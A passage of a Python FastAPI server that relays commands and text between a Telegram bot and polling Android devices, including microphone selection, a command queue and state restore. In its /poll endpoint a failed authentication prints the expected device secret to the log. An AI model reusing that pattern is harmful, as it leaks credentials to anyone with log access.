    await send_tg(chat_id, "🎙 Выбери микрофон:", reply_markup={"inline_keyboard": rows})
    return {"ok": True}


# ─── Text reply endpoint (Android → TG) ──────────────────────────────────────

@app.post("/text_reply")
async def text_reply(
    body: dict,
    x_device_secret: Optional[str] = Header(None),
):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")
    chat_id = body.get("chat_id") or ALLOWED_CHAT_ID
    text    = body.get("text", "")
    dev_id  = body.get("device_id", "?")
    model   = devices.get(dev_id, {}).get("model", dev_id)
    if chat_id and text:
        await send_tg(chat_id, f"📱 *{model}:*\n{text}")
    return {"ok": True}


# ─── Poll ─────────────────────────────────────────────────────────────────────

@app.get("/poll")
async def poll(
    x_device_secret: Optional[str] = Header(None),
    x_device_id:     Optional[str] = Header(None),
    x_device_model:  Optional[str] = Header(None),
):
    if x_device_secret != DEVICE_SECRET:
        print(f"403: got='{x_device_secret}' expected='{DEVICE_SECRET}'")
        raise HTTPException(status_code=403, detail="Forbidden")

    dev_id = x_device_id or "default"
    d = get_device(dev_id)
    d["last_seen"] = datetime.now()
    if x_device_model:
        d["model"] = x_device_model

    if d["pending_commands"]:
        cmd    = d["pending_commands"].pop(0)
        cmd_id = cmd.get("_id")
        if cmd_id and cmd_id in d["command_callbacks"]:
            cid = d["command_callbacks"].pop(cmd_id)
            cmd["_chat_id"] = cid
            asyncio.create_task(
                send_tg(cid, f"📲 Телефон получил команду `{cmd.get('cmd')}`."))
        # Если команда ban — удаляем дубли из очереди
        if cmd.get("cmd") == "ban":
            d["pending_commands"] = [
                c for c in d["pending_commands"] if c.get("cmd") != "ban"
            ]
        return {"active": d["active"], "command": cmd, "instance_id": INSTANCE_ID}

    return {"active": d["active"], "command": None, "instance_id": INSTANCE_ID}


# ─── Health ───────────────────────────────────────────────────────────────────



# ─── Восстановление состояния после рестарта ─────────────────────────────────

@app.post("/restore_state")
async def restore_state(
    x_device_secret: Optional[str] = Header(None),
    body: dict = None,
):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")
    if not body:
        return {"ok": False}

    restored = []

    raw_links = body.get("raw_links", [])
    if raw_links:
        state["raw_links"] = raw_links
        restored.append(f"raw_links: {len(raw_links)}")

    questions = body.get("questions", [])
    if questions:
        state["questions"] = questions
        restored.append(f"questions: {len(questions)}")

    if restored:
        await send_tg(ALLOWED_CHAT_ID, f"♻️ Состояние восстановлено после рестарта:\n" + "\n".join(restored))

    return {"ok": True, "restored": restored}


@app.get("/get_state")
async def get_state(x_device_secret: Optional[str] = Header(None)):
    if x_device_secret != DEVICE_SECRET:
        raise HTTPException(status_code=403, detail="Forbidden")
    return {
        "raw_links": state["raw_links"],
        "questions": state["questions"],
        "instance_id": INSTANCE_ID,
    }
@app.get("/health")
async def health():
    return {"status": "ok", "devices": len(devices)}
